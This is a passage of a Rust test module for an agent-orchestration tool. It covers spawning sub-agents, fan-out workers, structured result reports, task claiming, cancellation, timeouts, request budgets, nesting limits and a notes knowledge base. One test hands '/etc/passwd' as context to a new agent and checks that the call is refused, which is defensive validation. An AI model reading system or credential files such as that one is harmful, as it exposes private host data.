        opts.model = Some(model.clone());
        let (_tx, rx) = mpsc::channel();
        let started = std::time::Instant::now();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            rx,
        );
        assert_eq!(outcome.result, "counted them myself");
        assert!(started.elapsed() < Duration::from_secs(5), "it waited");
        // And it was told, up front, that the task is its own.
        let transcript = db.load_agent_messages(&format!("task-{}", id)).unwrap();
        assert!(transcript.iter().any(|m| {
            m["content"]
                .as_str()
                .is_some_and(|c| c.starts_with("You are running task #1 now"))
        }));
    }

    #[test]
    fn test_sessions_see_the_databases_profiles_under_their_own() {
        let conn = test_db_conn();
        {
            let c = conn.lock().unwrap();
            db::set_profile(&c, "deep", &serde_json::json!({"model": "big"})).unwrap();
            db::set_profile(&c, "fast", &serde_json::json!({"model": "db-small"})).unwrap();
            db::set_profile(&c, "broken", &serde_json::json!({"bogus": 1})).unwrap();
        }
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(conn));
        let mut opts = Opts::default();
        opts.profiles.insert(
            "fast".to_string(),
            serde_json::from_value(serde_json::json!({"model": "config-small"})).unwrap(),
        );
        let profiles = session_profiles(&opts, Some(db.as_ref()));
        assert_eq!(profiles["deep"].model.as_deref(), Some("big"));
        assert_eq!(
            profiles["fast"].model.as_deref(),
            Some("config-small"),
            "the config file wins"
        );
        assert!(!profiles.contains_key("broken"));
        assert_eq!(
            worker_profiles(&opts, &[]).unwrap(),
            None,
            "all, as they change"
        );
    }

    #[test]
    fn test_models_naming_a_default_profile_get_none() {
        let mut profiles = Profiles::new();
        assert_eq!(requested_profile(&profiles, Some("default".into())), None);
        assert_eq!(requested_profile(&profiles, Some(" ".into())), None);
        assert_eq!(
            requested_profile(&profiles, Some("fast".into())),
            Some("fast".to_string())
        );
        profiles.insert("default".to_string(), Profile::default());
        assert_eq!(
            requested_profile(&profiles, Some("default".into())),
            Some("default".to_string())
        );
    }

    #[test]
    fn test_no_profile_parameter_without_profiles() {
        let offers = |tools: &ToolsCollection, name: &str| {
            let schema: serde_json::Value = serde_json::from_str(&tools[name].schema).unwrap();
            schema["function"]["parameters"]["properties"]
                .get("profile")
                .is_some()
        };
        let mut opts = Opts::default();
        let without = session_tools(&opts);
        for name in ["spawn_agent", "fan_out", "task_create", "agent_create"] {
            assert!(!offers(&without, name), "{name}");
        }
        // Nor do the agents made from it.
        let agent = agent_tools(&without, false, &db::AgentConfig::default());
        assert!(!offers(&agent, "fan_out"));
        opts.profiles.insert("fast".to_string(), Profile::default());
        let with = session_tools(&opts);
        assert!(offers(&with, "fan_out"));
        assert!(offers(
            &agent_tools(&with, false, &db::AgentConfig::default()),
            "fan_out"
        ));
    }

    #[test]
    fn test_a_busy_worker_takes_no_more_tasks_for_itself() {
        let db = local_db_with_agents(&["w"]);
        // A live session's claims aren't up for grabs again.
        assert!(db.claim_agent("w", "s").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let mine = db
            .create_oneshot_task("mine", "", &past, "x", Some("w"))
            .unwrap();
        let anyone = db.create_oneshot_task("any", "", &past, "x", None).unwrap();
        let claim =
            |busy| claim_prompt_task_but(db.as_ref(), "s", "w", &[], busy, false).map(|t| t.id);
        // Busy with one of its own, it can still take tasks for anyone.
        assert_eq!(claim(true), Some(anyone));
        assert_eq!(claim(true), None);
        assert_eq!(claim(false), Some(mine));
    }

    #[test]
    fn test_report_result_takes_data_in_another_plain_form() {
        let mut ctx = ToolContext::new(|_: &str| {});
        let slot = Arc::new(Mutex::new(None));
        ctx.result_slot = Some(slot.clone());
        ctx.result_schema = Some(serde_json::json!({
            "lines": "number", "files": "integer", "ok": "boolean", "name": "string"
        }));
        // As a fan-out worker sent it: the number as a string.
        tool_report_result(
            &r#"{"status":"succeeded","summary":"Counted","data":{"lines": "853", "files": "3", "ok": "True", "name": 7}}"#
                .to_string(),
            &ctx,
        )
        .unwrap();
        let reported = slot.lock().unwrap().take().unwrap();
        assert_eq!(
            reported.data,
            Some(serde_json::json!({"lines": 853, "files": 3, "ok": true, "name": "7"}))
        );
        // What isn't one in any form still fails.
        for data in [
            r#"{"lines": "many"}"#,
            r#"{"files": "2.5"}"#,
            r#"{"ok": "yes"}"#,
        ] {
            let mut fields: serde_json::Value =
                serde_json::json!({"lines": 1, "files": 1, "ok": true, "name": "x"});
            for (k, v) in serde_json::from_str::<serde_json::Map<_, _>>(data).unwrap() {
                fields[k] = v;
            }
            let call = serde_json::json!({"status": "succeeded", "summary": "s", "data": fields});
            assert!(
                tool_report_result(&call.to_string(), &ctx).is_err(),
                "{data}"
            );
        }
    }

    #[test]
    fn test_report_result_takes_progress_and_loose_statuses() {
        let db = local_db_with_agents(&["worker"]);
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.db = Some(db.clone());
        ctx.agent_name = Some("worker".to_string());
        let slot = Arc::new(Mutex::new(None));
        ctx.result_slot = Some(slot.clone());
        // What a small model sent: progress, not a result.
        let out = tool_report_result(
            &r#"{"status":"in_progress","summary":"Reading src/agent_io.rs to count lines.","data":{"line_count": 0}}"#
                .to_string(),
            &ctx,
        )
        .unwrap();
        assert!(out.contains("not your result yet"), "{out}");
        assert!(slot.lock().unwrap().is_none());
        assert_eq!(
            db.get_agent("worker").unwrap().unwrap().activity.as_deref(),
            Some("Reading src/agent_io.rs to count lines.")
        );
        // Then the real one, however it's worded.
        tool_report_result(
            &r#"{"status":"Completed","summary":"283 lines"}"#.to_string(),
            &ctx,
        )
        .unwrap();
        let reported = slot.lock().unwrap().take().unwrap();
        assert!(reported.succeeded);
        assert_eq!(reported.summary, "283 lines");
        assert!(
            tool_report_result(&r#"{"status":"maybe","summary":"x"}"#.to_string(), &ctx).is_err()
        );
        assert!(matches!(
            report_status("FAILED"),
            ReportStatus::Final(false)
        ));
        assert!(matches!(
            report_status("in progress"),
            ReportStatus::Progress
        ));
    }

    #[test]
    fn test_structured_results_are_checked_and_corrected() {
        let (db, ctx) = spawning_setup(
            "schema",
            serde_json::json!([
                // First attempt is missing a field; the error makes it fix it.
                {"if": "triage issue", "tool": "report_result", "once": true,
                 "arguments": {"status": "succeeded", "summary": "dup", "data": {"duplicate": true}}},
                {"if": "data is missing 'of'", "tool": "report_result",
                 "arguments": {"status": "succeeded", "summary": "duplicate of 12", "data": {"duplicate": true, "of": 12}}},
                {"if": "Result recorded", "reply": "done"},
            ]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "triager", "prompt": "triage issue 40",
                                "result_schema": {"duplicate": "boolean", "of": "integer"}})
            .to_string(),
            &ctx,
        )
        .unwrap();
        let result = sub_agent_result(&db, "boss", "triager");
        assert!(result.starts_with("duplicate of 12\n```json"), "{result}");
        assert!(result.contains("\"of\": 12"), "{result}");
    }

    #[test]
    fn test_unreported_structured_result_gets_one_reminder() {
        let (db, ctx) = spawning_setup(
            "reminder",
            serde_json::json!([
                {"if": "You haven't reported", "tool": "report_result",
                 "arguments": {"status": "succeeded", "summary": "3 files", "data": {"count": 3}}},
                {"if": "Result recorded", "reply": "ok"},
                {"if": "count the files", "reply": "there are three"},
            ]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "counter", "prompt": "count the files", "result_schema": {"count": "integer"}})
                .to_string(),
            &ctx,
        )
        .unwrap();
        assert!(sub_agent_result(&db, "boss", "counter").starts_with("3 files"));
    }

    #[test]
    fn test_reported_failures_reach_the_parent_fan_out_and_tasks() {
        let (db, ctx) = spawning_setup(
            "failures",
            serde_json::json!([
                {"if": "check item 3", "tool": "report_result", "arguments": {"status": "failed", "summary": "item 3 is broken"}},
                {"if": "check item", "reply": "item ok"},
                {"if": "Result recorded", "reply": "reported"},
            ]),
        );
        // A sub-agent.
        tool_spawn_agent(
            &r#"{"name": "checker", "prompt": "check item 3"}"#.to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(
            sub_agent_result(&db, "boss", "checker"),
            "Failed: item 3 is broken"
        );
        assert_eq!(
            db.get_agent("checker")
                .unwrap()
                .unwrap()
                .activity
                .as_deref(),
            Some("failed: item 3 is broken")
        );
        // Fan-out workers.
        let out = fan_out::tool_fan_out(
            &serde_json::json!({"items": ["1", "3"], "prompt": "check item {item}"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert!(out.contains("## 1. 1\nitem ok"), "{out}");
        assert!(
            out.contains("## 2. 3\nError: reported failure - item 3 is broken"),
            "{out}"
        );
        // A prompt task run headlessly.
        db.create_agent("w", "").unwrap();
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let id = db
            .create_oneshot_task("t", "", &past, "check item 3", Some("w"))
            .unwrap();
        let task = claim_prompt_task(db.as_ref(), "worker-session", "w", &[]).unwrap();
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let mut opts = Opts::default();
        opts.model = Some(extra.opts.model.clone());
        let (_tx, rx) = mpsc::channel();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            rx,
        );
        assert!(!outcome.succeeded);
        assert_eq!(
            db.get_task(id).unwrap().unwrap().last_outcome.as_deref(),
            Some("failed")
        );
    }

    #[test]
    fn test_context_is_handed_to_the_new_agent() {
        let (db, ctx) = spawning_setup("handoff", serde_json::json!([{"reply": "on it"}]));
        db.kb_write("Deploying", "make deploy", &[], Some("boss"), None)
            .unwrap();
        tool_spawn_agent(
            &serde_json::json!({"name": "helper", "prompt": "go",
                                "context": {"notes": ["deploying"], "files": ["Cargo.toml"]}})
            .to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(sub_agent_result(&db, "boss", "helper"), "on it");
        // system, working directory, handoff, task, answer.
        let transcript = db.load_agent_messages("helper").unwrap();
        let handoff = transcript[2]["content"].as_str().unwrap();
        assert!(
            handoff.contains("## Note: Deploying\nmake deploy"),
            "{handoff}"
        );
        assert!(
            handoff.contains("## File: Cargo.toml\n```\n[package]"),
            "{handoff}"
        );
        assert_eq!(transcript[3]["content"], "go");
        for bad in [r#"{"notes": ["nope"]}"#, r#"{"files": ["/etc/passwd"]}"#] {
            let params = format!(r#"{{"name": "x", "prompt": "go", "context": {}}}"#, bad);
            assert!(tool_spawn_agent(&params, &ctx).is_err(), "{bad}");
        }
    }

    #[test]
    fn test_report_result_needs_someone_waiting() {
        let ctx = test_ctx();
        let err = tool_report_result(
            &r#"{"status": "succeeded", "summary": "x"}"#.to_string(),
            &ctx,
        )
        .unwrap_err()
        .to_string();
        assert!(err.contains("nobody is waiting"), "{err}");
    }

    #[test]
    fn test_agent_cancel_stops_a_sub_agent_and_says_so() {
        let (db, ctx) = spawning_setup(
            "cancel",
            serde_json::json!([{"if": "slow job", "reply": "done", "delay_ms": 30000}]),
        );
        let spawn = serde_json::json!({"name": "worker", "prompt": "slow job"}).to_string();
        tool_spawn_agent(&spawn, &ctx).unwrap();
        assert!(
            tool_spawn_agent(&spawn, &ctx)
                .unwrap_err()
                .to_string()
                .contains("already running")
        );

        // Only the agent that started it (or one above it) may cancel it.
        let bystander = chat_ctx(db.clone(), "bystander");
        let err = tool_agent_cancel(&r#"{"name":"worker"}"#.to_string(), &bystander).unwrap_err();
        assert!(err.to_string().contains("can only cancel"), "{err}");

        let started = std::time::Instant::now();
        tool_agent_cancel(&r#"{"name":"worker"}"#.to_string(), &ctx).unwrap();
        assert_eq!(
            sub_agent_result(&db, "boss", "worker"),
            "Stopped: cancelled by boss"
        );
        assert!(started.elapsed() < std::time::Duration::from_secs(5));
        assert!(eventually(|| tool_agent_cancel(
            &r#"{"name":"worker"}"#.to_string(),
            &ctx
        )
        .is_err_and(|e| e.to_string().contains("no sub-agent named"))));
    }

    #[test]
    fn test_sub_agent_timeout() {
        let (db, ctx) = spawning_setup(
            "timeout",
            serde_json::json!([{"if": "slow job", "reply": "done", "delay_ms": 30000}]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "slowpoke", "prompt": "slow job", "timeout_seconds": 1})
                .to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(
            sub_agent_result(&db, "boss", "slowpoke"),
            "Stopped: timed out after 1s"
        );
    }

    #[test]
    fn test_sub_agent_request_budget() {
        // A sub-agent that would call tools forever.
        let (db, ctx) = spawning_setup(
            "budget",
            serde_json::json!([{"tool": "glob", "arguments": {"pattern": "Cargo.toml"}}]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "looper", "prompt": "go", "max_requests": 3}).to_string(),
            &ctx,
        )
        .unwrap();
        let result = sub_agent_result(&db, "boss", "looper");
        assert!(result.contains("budget of 3 requests"), "{result}");
    }

    #[test]
    fn test_parse_chat_command_cancel() {
        assert!(
            matches!(parse_chat_command("/cancel worker"), ChatCommand::Cancel(n) if n == "worker")
        );
        assert!(matches!(
            parse_chat_command("/cancel"),
            ChatCommand::Invalid(_)
        ));
    }

    fn agent_row(name: &str, parent: Option<&str>) -> db::AgentRow {
        db::AgentRow {
            name: name.to_string(),
            description: String::new(),
            created_at: String::new(),
            session_id: None,
            heartbeat_at: None,
            parent: parent.map(String::from),
            activity: None,
            activity_at: None,
        }
    }

    #[test]
    fn test_agent_tree_draws_children_under_their_parent() {
        let agents = vec![
            agent_row("boss", None),
            agent_row("a", Some("boss")),
            agent_row("a1", Some("a")),
            agent_row("b", Some("boss")),
            agent_row("orphan", Some("gone")),
        ];
        let lines: Vec<String> = agent_tree(&agents)
            .into_iter()
            .map(|(prefix, agent)| format!("{}{}", prefix, agent.name))
            .collect();
        assert_eq!(lines, ["boss", "├─ a", "│  └─ a1", "└─ b", "orphan"]);
    }

    #[test]
    fn test_finished_sub_agent_keeps_its_activity_and_transcript() {
        let (db, ctx) = spawning_setup(
            "transcript",
            serde_json::json!([
                {"if": "look around", "tool": "glob", "arguments": {"pattern": "Cargo.toml"}},
                {"if": "Cargo.toml", "reply": "found the manifest"},
            ]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "scout", "prompt": "look around"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(sub_agent_result(&db, "boss", "scout"), "found the manifest");
        let scout = db
            .get_agent("scout")
            .unwrap()
            .expect("kept after finishing");
        assert_eq!(
            scout.activity.as_deref(),
            Some("finished: found the manifest")
        );
        let transcript = db.load_agent_messages("scout").unwrap();
        // system, working directory, user, tool call, tool result, answer.
        assert_eq!(transcript.len(), 6, "{transcript:?}");
        assert!(
            transcript[1]["content"]
                .as_str()
                .unwrap()
                .starts_with("You work in the directory")
        );
        assert_eq!(transcript[3]["tool_calls"][0]["function"]["name"], "glob");
        agents_command(
            &Opts::default(),
            &Some(db.clone()),
            Some(&AgentsAction::Show {
                name: "scout".to_string(),
                full: false,
            }),
            None,
        )
        .unwrap();
        agents_command(&Opts::default(), &Some(db), None, None).unwrap();
    }

    #[test]
    fn test_fan_out_shows_progress_as_the_callers_activity() {
        let model = model_script(
            "progress",
            serde_json::json!([{"if": "check", "reply": "ok"}]),
        );
        let db = local_db_with_agents(&["boss"]);
        let ctx = chat_ctx_with_model(db.clone(), "boss", &model);
        fan_out::tool_fan_out(
            &serde_json::json!({"items": ["a", "b", "c"], "prompt": "check {item}"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(
            db.get_agent("boss").unwrap().unwrap().activity.as_deref(),
            Some("fan_out: 3/3 done")
        );
    }

    #[test]
    fn test_fan_out_workers_can_be_seen_as_agents() {
        let model = model_script(
            "visible",
            serde_json::json!([{"if": "check", "reply": "ok"}]),
        );
        let db = local_db_with_agents(&["boss"]);
        let mut ctx = chat_ctx_with_model(db.clone(), "boss", &model);
        // Fanning out for a task: the workers' events are the task's too.
        ctx.task_id = Some(7);
        fan_out::tool_fan_out(
            &serde_json::json!({"items": ["a", "b"], "prompt": "check {item}"}).to_string(),
            &ctx,
        )
        .unwrap();
        let of_task = db
            .agent_events(&faber::agent_io::EventFilter {
                task_id: Some(7),
                limit: 100,
                ..Default::default()
            })
            .unwrap();
        assert!(of_task.iter().any(|r| r.agent == "boss-item-1"));
        assert!(of_task.iter().any(|r| r.agent == "boss-item-2"));
        for (i, item) in ["a", "b"].iter().enumerate() {
            let name = format!("boss-item-{}", i + 1);
            let agent = db.get_agent(&name).unwrap().expect("a worker agent");
            assert_eq!(agent.parent.as_deref(), Some("boss"));
            assert_eq!(agent.activity.as_deref(), Some("finished: ok"));
            assert!(agent.session_id.is_none(), "released once done");
            let events: Vec<_> = db
                .agent_events(&faber::agent_io::EventFilter {
                    agent: Some(name.clone()),
                    limit: 10,
                    ..Default::default()
                })
                .unwrap()
                .into_iter()
                .map(|r| r.event)
                .collect();
            assert!(matches!(&events[0], AgentEvent::Input { text } if text.contains(item)));
            assert!(matches!(
                events.last(),
                Some(AgentEvent::TurnEnd {
                    succeeded: true,
                    ..
                })
            ));
        }
    }

    #[test]
    fn test_fan_out_shows_every_worker_before_it_starts() {
        let model = model_script(
            "queued",
            serde_json::json!([{"if": "check", "reply": "ok", "delay_ms": 400}]),
        );
        let db = local_db_with_agents(&["boss"]);
        let ctx = chat_ctx_with_model(db.clone(), "boss", &model);
        std::thread::scope(|scope| {
            scope.spawn(|| {
                fan_out::tool_fan_out(
                    &serde_json::json!({"items": ["a", "b", "c"], "prompt": "check {item}", "max_parallel": 1})
                        .to_string(),
                    &ctx,
                )
                .unwrap();
            });
            // One at a time, yet all three are there, the rest queued.
            assert!(eventually(|| {
                let agents = db.list_agents().unwrap();
                let workers: Vec<_> = agents
                    .iter()
                    .filter(|a| a.name.starts_with("boss-item-"))
                    .collect();
                workers.len() == 3
                    && workers
                        .iter()
                        .filter(|a| a.activity.as_deref() == Some("queued"))
                        .count()
                        >= 1
            }));
        });
        for i in 1..=3 {
            let agent = db.get_agent(&format!("boss-item-{}", i)).unwrap().unwrap();
            assert_eq!(agent.activity.as_deref(), Some("finished: ok"));
        }
    }

    #[test]
    fn test_task_create_targets_and_task_wait() {
        let db = local_db_with_agents(&["boss", "helper"]);
        db.set_agent_parent("helper", Some("boss")).unwrap();
        let ctx_of = |agent: &str| {
            let mut ctx = ToolContext::new(|_: &str| {});
            ctx.db = Some(db.clone());
            ctx.agent_name = Some(agent.to_string());
            ctx
        };
        let create = |ctx: &ToolContext| -> serde_json::Value {
            serde_json::from_str(
                &tool_task_create(&r#"{"name": "t", "command": "do it"}"#.to_string(), ctx)
                    .unwrap(),
            )
            .unwrap()
        };
        // A chat's agent gets its own task, told not to wait for it...
        let boss = ctx_of("boss");
        let own = create(&boss);
        assert_eq!(own["runs_on"], "boss");
        assert!(
            own["note"].as_str().unwrap().contains("end your turn"),
            "{own}"
        );
        let err = tool_task_wait(&format!(r#"{{"ids": [{}]}}"#, own["id"]), &boss).unwrap_err();
        assert!(err.to_string().contains("runs on you"), "{err}");
        // ...a sub-agent's goes to any agent, as nobody picks up its own.
        let helper = ctx_of("helper");
        let any = create(&helper);
        assert_eq!(any["runs_on"], "any agent");
        let id = any["id"].as_i64().unwrap();
        assert!(db.get_task(id).unwrap().unwrap().agent_name.is_none());
        // task_wait gets its result once someone has run it.
        assert!(db.claim_agent("boss", "s").unwrap());
        assert!(db.claim_task(id, "s").unwrap());
        std::thread::scope(|scope| {
            scope.spawn(|| {
                std::thread::sleep(Duration::from_millis(300));
                let outcome = db::TaskOutcome {
                    succeeded: true,
                    exit_code: None,
                    result: "did it".to_string(),
                };
                db.finish_task(id, "s", &outcome).unwrap();
            });
            let out = tool_task_wait(&format!(r#"{{"ids": [{}]}}"#, id), &helper).unwrap();
            assert!(out.contains("succeeded: did it"), "{out}");
        });
    }

    #[test]
    fn test_sub_agents_can_spawn_their_own() {
        let model = model_script(
            "nested",
            serde_json::json!([
                // spawn_agent's own result echoes the prompt: answer it first.
                {"if": "\"status\":\"spawned\"", "reply": "started"},
                {"if": "start", "tool": "spawn_agent", "arguments": {"name": "lvl1", "prompt": "level one"}},
                {"if": "level one", "tool": "spawn_agent", "arguments": {"name": "lvl2", "prompt": "level two"}},
                {"if": "level two", "reply": "deep enough"},
            ]),
        );
        let db = local_db_with_agents(&["boss"]);
        let ctx = chat_ctx_with_model(db.clone(), "boss", &model);
        assert_eq!(run_turn(&ctx, &model, "start"), "started");
        assert!(
            eventually(|| db
                .agent_lineage("lvl2")
                .map(|l| l == ["lvl2", "lvl1", "boss"])
                .unwrap_or(false)),
            "lvl1 should have spawned lvl2"
        );
    }

    #[test]
    fn test_sub_agent_nesting_is_limited() {
        let names: Vec<String> = (0..MAX_AGENT_DEPTH).map(|i| format!("a{}", i)).collect();
        let refs: Vec<&str> = names.iter().map(String::as_str).collect();
        let db = local_db_with_agents(&refs);
        for pair in names.windows(2) {
            db.set_agent_parent(&pair[1], Some(&pair[0])).unwrap();
        }
        let deepest = names.last().unwrap();
        let err = tool_spawn_agent(
            &serde_json::json!({"name": "too-deep", "prompt": "x"}).to_string(),
            &chat_ctx(db.clone(), deepest),
        )
        .unwrap_err()
        .to_string();
        assert!(err.contains("levels deep"), "{err}");
        // One level up still works.
        tool_spawn_agent(
            &serde_json::json!({"name": "ok", "prompt": "x"}).to_string(),
            &chat_ctx(db, &names[MAX_AGENT_DEPTH - 2]),
        )
        .unwrap();
    }

    #[test]
    fn test_spawn_agent_records_its_parent_and_refuses_ancestors() {
        let db = local_db_with_agents(&["boss"]);
        let spawn = |as_agent: &str, name: &str| {
            tool_spawn_agent(
                &serde_json::json!({"name": name, "prompt": "hi"}).to_string(),
                &chat_ctx(db.clone(), as_agent),
            )
        };
        spawn("boss", "helper").unwrap();
        assert_eq!(
            db.get_agent("helper").unwrap().unwrap().parent.as_deref(),
            Some("boss")
        );
        spawn("helper", "intern").unwrap();
        assert_eq!(
            db.get_agent("intern").unwrap().unwrap().parent.as_deref(),
            Some("helper")
        );
        // An agent can't spawn itself or one of the agents above it.
        let err = spawn("intern", "boss").unwrap_err().to_string();
        assert!(err.contains("isn't one of the agents you made"), "{err}");
        assert!(spawn("boss", "boss").is_err());
        assert_eq!(
            db.get_agent("boss").unwrap().unwrap().parent,
            None,
            "left untouched"
        );
    }

    #[test]
    fn test_kb_tools_follow_the_agent_lineage() {
        let db = local_db_with_agents(&["boss", "helper"]);
        db.set_agent_parent("helper", Some("boss")).unwrap();
        let call = |agent: &str, f: ToolCallback, params: serde_json::Value| {
            f(&params.to_string(), &chat_ctx(db.clone(), agent)).unwrap()
        };
        call(
            "boss",
            tool_kb_write,
            serde_json::json!({"title": "Boss plan", "body": "ship friday", "private": true}),
        );
        call(
            "helper",
            tool_kb_write,
            serde_json::json!({"title": "Helper scratch", "body": "tried rebasing", "private": true}),
        );

        // The helper sees the boss's private note; the boss doesn't see the
        // helper's.
        let helper_sees = call(
            "helper",
            tool_kb_search,
            serde_json::json!({"query": "friday rebasing"}),
        );
        assert!(
            helper_sees.contains("Boss plan") && helper_sees.contains("Helper scratch"),
            "{helper_sees}"
        );
        let boss_sees = call(
            "boss",
            tool_kb_search,
            serde_json::json!({"query": "friday rebasing"}),
        );
        assert!(
            boss_sees.contains("Boss plan") && !boss_sees.contains("Helper scratch"),
            "{boss_sees}"
        );
        let read = call(
            "boss",
            tool_kb_read,
            serde_json::json!({"title": "helper scratch"}),
        );
        assert_eq!(read, "No such note.");

        // The helper's private notes go with it; the boss's stay.
        db.delete_agent("helper").unwrap();
        let after = call("boss", tool_kb_list, serde_json::json!({}));
        assert!(after.contains("Boss plan"), "{after}");
    }

    #[test]
    fn test_kb_cli_commands() {
        let db = local_db_with_agents(&["bot"]);
        let run = |action: KbAction| kb_command_inner(db.as_ref(), Some(&action), None, 50);
        run(KbAction::Add {
            title: "Deploying".to_string(),
            body: Some("make deploy".to_string()),
            tags: vec!["ops".to_string()],
            agent: None,
        })
        .unwrap();
        run(KbAction::Add {
            title: "Bot notes".to_string(),
            body: Some("private to the bot".to_string()),
            tags: vec![],
            agent: Some("bot".to_string()),
        })
        .unwrap();
        // The user sees every note, private ones included.
        assert_eq!(db.kb_list(&db::KbViewer::User, None, 10).unwrap().len(), 2);
        let note = db
            .kb_get_by_title("deploying", &db::KbViewer::User)
            .unwrap()
            .unwrap();
        assert_eq!(
            (note.body.as_str(), note.created_by.as_deref()),
            ("make deploy", Some("user"))
        );
        run(KbAction::Show {
            note: note.id.to_string(),
        })
        .unwrap();
        run(KbAction::Show {
            note: "bot notes".to_string(),
        })
        .unwrap();
        assert!(
            run(KbAction::Show {
                note: "missing".to_string()
            })
            .is_err()
        );
        run(KbAction::Search {
            query: "deploy".to_string(),
            tag: Some("ops".to_string()),
            limit: 5,
        })
        .unwrap();

        let err = run(KbAction::Rm {
            ids: vec![note.id, 999],
        })
        .unwrap_err()
        .to_string();
        assert!(err.contains("1 of 2"), "{err}");
        assert!(
            db.kb_get(note.id, &db::KbViewer::User).unwrap().is_none(),
            "the existing one went"
        );
        assert!(
            run(KbAction::Add {
                title: "x".to_string(),
                body: Some("y".to_string()),
                tags: vec![],
                agent: Some("nobody".to_string()),
            })
            .is_err()
        );
    }

    #[test]
    fn test_kb_cli_on_a_database_without_a_knowledge_base() {
        let path = std::env::temp_dir().join(format!("faber_test_nokb_{}.db", std::process::id()));
        let path = path.to_str().unwrap().to_string();
        let _ = std::fs::remove_file(&path);
        let conn = rusqlite::Connection::open(&path).unwrap();
        db::initialize_db(&conn).unwrap();
        conn.execute_batch("DROP TABLE kb_fts; DROP TABLE kb_notes;")
            .unwrap();
        drop(conn);
        let db: Option<Arc<dyn DbBackend>> = Some(Arc::new(LocalDb::new(Arc::new(Mutex::new(
            db::open_read_only(&path).unwrap(),
        )))));
        let err = kb_command(&db, None, None, 50).unwrap_err().to_string();
        assert!(err.contains("no knowledge base yet"), "{err}");
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn test_hold_and_release_commands_report_what_they_couldnt_change() {
        let db = local_db_with_agents(&[]);
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let a = db
            .create_oneshot_task("a", "", &past, "do a", None)
            .unwrap();
        let b = db
            .create_oneshot_task("b", "", &past, "do b", None)
            .unwrap();
        let db = Some(db);
        hold_tasks_command(&db, &[a, b], true).unwrap();
        let tasks = db.as_ref().unwrap();
        assert_eq!(tasks.get_task(a).unwrap().unwrap().status, "held");
        let err = hold_tasks_command(&db, &[a, 999], true)
            .unwrap_err()
            .to_string();
        assert!(err.contains("2 of 2"), "{err}");
        hold_tasks_command(&db, &[a], false).unwrap();
        assert_eq!(tasks.get_task(a).unwrap().unwrap().status, "scheduled");
        assert_eq!(tasks.get_task(b).unwrap().unwrap().status, "held");
        assert!(hold_tasks_command(&db, &[a], false).is_err(), "not on hold");
    }

    #[test]
    fn test_prune_command_done_ignores_age_unless_older_than_is_given() {
        let db = local_db_with_agents(&[]);
        db.create_agent("default", "").unwrap();
        assert!(db.claim_agent("default", "s").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let recent = db
            .create_oneshot_task("recent", "", &past, "x", None)
            .unwrap();
        let waiting = db
            .create_oneshot_task("waiting", "", &past, "x", None)
            .unwrap();
        assert!(db.claim_task(recent, "s").unwrap());
        let ok = db::TaskOutcome {
            succeeded: true,
            exit_code: None,
            result: String::new(),
        };
        assert!(db.finish_task(recent, "s", &ok).unwrap());
        let db = Some(db);

        prune_tasks_command(&db, None, false, false).unwrap();
        assert!(
            db.as_ref().unwrap().get_task(recent).unwrap().is_some(),
            "7d default keeps it"
        );
        prune_tasks_command(&db, Some("1d"), true, false).unwrap();
        assert!(
            db.as_ref().unwrap().get_task(recent).unwrap().is_some(),
            "--older-than still applies"
        );
        prune_tasks_command(&db, None, true, true).unwrap();
        assert!(
            db.as_ref().unwrap().get_task(recent).unwrap().is_some(),
            "dry run"
        );
        prune_tasks_command(&db, None, true, false).unwrap();
        assert!(
            db.as_ref().unwrap().get_task(recent).unwrap().is_none(),
            "--done removes it"
        );
        assert!(
            db.as_ref().unwrap().get_task(waiting).unwrap().is_some(),
            "never a scheduled one"
        );
        assert!(prune_tasks_command(&db, Some("soon"), false, false).is_err());
    }

    #[test]
    fn test_kb_tools_round_trip() {
        let mut ctx = plan_test_ctx();
        let call = |f: ToolCallback, ctx: &ToolContext, params: serde_json::Value| {
            f(&params.to_string(), ctx).unwrap()
        };
        let saved = call(
            tool_kb_write,
            &ctx,
            serde_json::json!({"title": "Deploying", "body": "Run `make deploy` from main.", "tags": ["ops"]}),
        );
        let id = serde_json::from_str::<serde_json::Value>(&saved).unwrap()["id"]
            .as_i64()
            .unwrap();

        let found = call(
            tool_kb_search,
            &ctx,
            serde_json::json!({"query": "how to deploy"}),
        );
        assert!(
            found.starts_with(&format!("#{} Deploying [ops]", id)),
            "{found}"
        );
        assert!(found.contains("[deploy]"), "{found}");

        let read = call(
            tool_kb_read,
            &ctx,
            serde_json::json!({"title": "deploying"}),
        );
        assert!(read.starts_with("# Deploying\n"), "{read}");
        assert!(read.contains("by default"), "{read}");
        assert!(read.ends_with("Run `make deploy` from main."), "{read}");

        // A private note isn't visible to an agent-less caller.
        call(
            tool_kb_write,
            &ctx,
            serde_json::json!({"title": "Mine", "body": "secret", "private": true}),
        );
        ctx.agent_name = None;
        assert_eq!(
            call(tool_kb_search, &ctx, serde_json::json!({"query": "secret"})),
            "No notes match."
        );
        assert!(
            tool_kb_write(
                &serde_json::json!({"title": "x", "body": "y", "private": true}).to_string(),
                &ctx
            )
            .is_err()
        );

        assert!(call(tool_kb_list, &ctx, serde_json::json!({})).contains("Deploying"));
        let deleted = call(tool_kb_delete, &ctx, serde_json::json!({"id": id}));
